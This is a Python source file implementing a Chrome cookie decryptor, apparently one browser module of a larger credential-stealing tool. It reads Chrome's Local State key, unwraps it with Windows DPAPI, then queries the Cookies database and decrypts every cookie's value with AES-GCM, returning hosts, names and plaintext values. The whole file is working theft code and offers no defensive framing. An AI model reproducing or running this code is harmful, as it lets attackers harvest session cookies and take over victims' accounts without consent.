from decryptors.Decryptor import Decryptor
import os
import win32crypt
import base64
import sqlite3
import json
from Crypto.Cipher import AES

class Chrome(Decryptor):

    chrome_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\"
    
    def Decrypt(self):
        out = []

        if(os.path.exists(Chrome.chrome_path)):
            key_json = os.path.join(Chrome.chrome_path, "User Data", "Local State")
            with open(key_json, "r") as file:
                json_obj = json.loads(file.read())
                encrypted_key = json_obj["os_crypt"]["encrypted_key"]

                encrypted_key_base64 = base64.b64decode(encrypted_key.encode("utf-8"))
                encryption_key = win32crypt.CryptUnprotectData(encrypted_key_base64[5:])

            db_path = os.path.join(Chrome.chrome_path, "User Data", "Default", "Network", "Cookies")
            connection = sqlite3.connect(db_path)

            cursor = connection.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM 'cookies';")

            for host, name, encrypted_val in cursor.fetchall():
                nonce = encrypted_val[3:15]
                ciphertext_tag = encrypted_val[15:len(encrypted_val) - 16]
                cipher = AES.new(key = encryption_key[1], mode = AES.MODE_GCM, nonce = nonce)

                out.append({
                    "host": host,
                    "name": name,
                    "value": cipher.decrypt(ciphertext_tag).decode("utf-8")
                })

            cursor.close()
            connection.close()

        return out

    def GetBrowser(self):
        return "Chrome"
